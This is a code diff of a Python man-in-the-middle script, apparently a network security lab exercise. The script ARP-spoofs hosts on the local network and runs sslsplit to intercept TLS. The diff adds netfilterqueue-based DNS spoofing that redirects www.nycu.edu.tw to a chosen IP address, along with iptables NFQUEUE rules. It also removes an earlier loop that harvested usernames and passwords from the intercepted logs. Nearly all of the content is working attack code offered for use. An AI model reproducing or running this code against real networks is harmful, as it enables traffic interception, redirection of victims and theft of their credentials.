@@ -1,18 +1,49 @@
 #!/usr/bin/env python3
-import struct
+import netfilterqueue
 import os
+import threading
+import struct
 import subprocess
 import socket
 import re
 import fcntl
-from urllib.parse import unquote
 from scapy.all import *
 from time import *
 from util import *
 
+def process_packet(packet):
+    scapy_packet = IP(packet.get_payload())
+    if scapy_packet.haslayer(DNSRR):
+        #print(scapy_packet.show())
+        qname = scapy_packet[DNSQR].qname
+        if "www.nycu.edu.tw" in qname.decode():
+            print("[+] Spoofing target")
+            answer = DNSRR(rrname=qname, rdata="140.113.207.246")
+            scapy_packet[DNS].an = answer
+            scapy_packet[DNS].ancount = 1
+
+            del scapy_packet[IP].len
+            del scapy_packet[IP].chksum
+            del scapy_packet[UDP].chksum
+            del scapy_packet[UDP].len
+
+            packet.set_payload(bytes(scapy_packet))
+
+    return packet.accept()
+
+class dns_init(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+    def run(self):
+        self.queue = netfilterqueue.NetfilterQueue()
+        self.queue.bind(0, process_packet)
+        self.queue.run()
+    def dns_stop(self):
+        self.queue.unbind()
+
 if __name__ == "__main__":
 
-    # init iptables to get clean iptables
+    # init iptables
     iptables_init()
     
     ip          = getHostIp()
@@ -60,7 +91,7 @@ if __name__ == "__main__":
             mac.remove(mac[i])
             break
     
-    # show all device's ip and mac address for debug
+    # show all device's ip and mac address
     # print("")
 
     # print("nic card: ", nic)
@@ -82,7 +113,19 @@ if __name__ == "__main__":
     # execute sslplit 
     sslsplit()
 
-    sending_flag = True
+    # iptables rules for dns spoofing
+    os.system(
+        'iptables -I FORWARD -j NFQUEUE --queue-num 0')
+    os.system(
+        'iptables -I OUTPUT -j NFQUEUE --queue-num 0')
+    os.system(
+        'iptables -I INPUT -j NFQUEUE --queue-num 0')
+
+    # build thread
+    t = dns_init()
+    t.daemon = True
+    t.start()
+
     try:
         while(1):
             # send arp relies spoofing
@@ -104,19 +147,16 @@ if __name__ == "__main__":
                     # https://stackoverflow.com/questions/15377150/how-can-i-call-the-send-function-without-getting-output
                     send(victimpacket, verbose=0)
                     send(routerpacket, verbose=0)
-                    if(sending_flag):
-                        print("Send to: ",ip[j]," ",mac[j])
 
             # get all username and password in log file
-            for file in os.listdir("logdir/"):
-                with open("logdir/" + file, 'r', encoding='utf-8', errors='ignore') as f:
-                    for line in f:
-                        if ("username=" in line) and ("password=" in line):
-                            # print(type(line), line)
-                            if(re.findall("username=(.*?)&password=(.*?)&captcha_code=HTTP/1.1 303 See Other", line) != []):
-                                (username, passwd) = re.findall("username=(.*?)&password=(.*?)&captcha_code=HTTP/1.1 303 See Other", line)[0]
-                                print("username: ", unquote(username)," password: ",  unquote(passwd))
-            sending_flag = False
-            sleep(1)
-    finally:
-        print("done")
+            #print(" ")
+            #print("-----------------------------------------------------------------------------")
+            sleep(2)
+    except KeyboardInterrupt:
+        t.dns_stop()
+        #t.join()
+        os.system('iptables --flush')
+        print("Done")
+
+
+
